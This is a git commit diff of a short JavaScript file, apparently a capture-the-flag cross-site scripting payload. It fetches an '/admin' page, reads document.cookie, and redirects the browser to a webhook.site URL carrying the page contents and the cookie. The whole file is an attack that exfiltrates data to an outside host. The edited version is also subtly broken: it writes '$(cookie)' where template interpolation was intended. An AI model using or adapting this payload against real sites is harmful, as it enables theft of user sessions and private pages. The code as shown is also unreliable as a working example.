b35acd4555b39d8e4e303ef7d303c9a210d029a3
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-04-28 16:26:53 +0530

    Update and rename flagfetchr.js to flagfetch.js

--- flagfetch.js
+++ flagfetch.js
@@ -1,21 +1,18 @@
-async function sendFlagAndCookieToWebhook(webhookUrl) {
+async function sendFlagToWebhook(webhookUrl) {
   try {
-    const response = await fetch('/admin', {
-      credentials: 'include'
-    });
+    const response = await fetch('/admin');
     const data = await response.text();
     console.log(data);
 
     const encodedData = encodeURIComponent(data);
     const cookie = document.cookie;
-    const encodedCookie = encodeURIComponent(cookie);
-    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookie=${encodedCookie}`;
+    const encodedcookie = encodeURIComponent(cookie);
+    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=$(cookie)`;
 
     document.location = urlWithQueryParams;
   } catch (error) {
     console.error('Error:', error);
   }
 }
-
 
 sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
